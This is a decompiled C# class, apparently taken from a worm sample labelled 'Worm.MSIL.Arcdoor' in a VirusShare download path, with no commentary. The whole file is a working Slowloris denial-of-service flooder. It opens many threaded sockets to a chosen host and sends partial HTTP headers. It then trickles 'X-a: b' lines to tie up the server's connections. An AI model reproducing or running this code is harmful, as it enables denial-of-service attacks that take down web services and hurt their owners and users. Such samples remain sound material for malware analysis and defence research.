// Decompiled with JetBrains decompiler
// Type: SysDriver.nSlowlorisFlood
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SysDriver
{
  public class nSlowlorisFlood
  {
    public static string sFHost;
    private static IPEndPoint IPEo;
    public static ushort uPort;
    public static int iThreads;
    public static int iSockets;
    public static int iTimeout = 30;
    private static ThreadStart[] tFloodingJob;
    private static Thread[] tFloodingThread;
    private static nSlowlorisFlood.SlowlorisRequest[] SlowlorisClass;

    public static void Start()
    {
      try
      {
        nSlowlorisFlood.IPEo = new IPEndPoint(Dns.GetHostEntry(nSlowlorisFlood.sFHost).AddressList[0], (int) nSlowlorisFlood.uPort);
      }
      catch
      {
        nSlowlorisFlood.IPEo = new IPEndPoint(IPAddress.Parse(nSlowlorisFlood.sFHost), (int) nSlowlorisFlood.uPort);
      }
      nSlowlorisFlood.tFloodingThread = new Thread[nSlowlorisFlood.iThreads];
      nSlowlorisFlood.tFloodingJob = new ThreadStart[nSlowlorisFlood.iThreads];
      nSlowlorisFlood.SlowlorisClass = new nSlowlorisFlood.SlowlorisRequest[nSlowlorisFlood.iThreads];
      for (int index = 0; index < nSlowlorisFlood.iThreads; ++index)
      {
        nSlowlorisFlood.SlowlorisClass[index] = new nSlowlorisFlood.SlowlorisRequest(nSlowlorisFlood.IPEo, nSlowlorisFlood.iSockets, nSlowlorisFlood.iTimeout);
        nSlowlorisFlood.tFloodingJob[index] = new ThreadStart(nSlowlorisFlood.SlowlorisClass[index].Send);
        nSlowlorisFlood.tFloodingThread[index] = new Thread(nSlowlorisFlood.tFloodingJob[index]);
        nSlowlorisFlood.tFloodingThread[index].Start();
      }
    }

    public static void Stop()
    {
      for (int index = 0; index < nSlowlorisFlood.iThreads; ++index)
      {
        try
        {
          nSlowlorisFlood.SlowlorisClass[index].RequestStop();
          nSlowlorisFlood.tFloodingThread[index].Join();
        }
        catch
        {
        }
      }
    }

    private class SlowlorisRequest
    {
      private IPEndPoint IPEo;
      private Socket[] pSockets;
      private int iSockets;
      private int iTimeout;
      private volatile bool _shouldStop;

      public SlowlorisRequest(IPEndPoint tIPEo, int iSockets, int iTimeout)
      {
        this.IPEo = tIPEo;
        this.iSockets = iSockets;
        this.iTimeout = iTimeout;
      }

      public void RequestStop() => this._shouldStop = true;

      public void Send()
      {
        try
        {
          this.pSockets = new Socket[this.iSockets];
          while (!this._shouldStop)
          {
            for (int index = 0; index < this.iSockets; ++index)
            {
              if (this.pSockets[index] == null || !this.pSockets[index].Connected)
              {
                this.pSockets[index] = new Socket(this.IPEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                this.pSockets[index].Connect((EndPoint) this.IPEo);
                byte[] bytes = Encoding.ASCII.GetBytes("GET /" + "" + " HTTP/1.1\r\nHost: " + (object) this.IPEo.Address + "\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n");
                this.pSockets[index].Send(bytes, bytes.Length, SocketFlags.None);
              }
            }
            for (int index = 0; index < this.iSockets; ++index)
            {
              try
              {
                if (this.pSockets[index].Connected)
                {
                  byte[] bytes = Encoding.ASCII.GetBytes("X-a: b\r\n");
                  this.pSockets[index].Send(bytes, bytes.Length, SocketFlags.None);
                }
              }
              catch
              {
              }
            }
            Thread.Sleep(this.iTimeout * 1000);
          }
          for (int index = 0; index < this.iSockets; ++index)
          {
            this.pSockets[index].Shutdown(SocketShutdown.Both);
            this.pSockets[index].Close();
          }
        }
        catch
        {
        }
      }
    }
  }
}
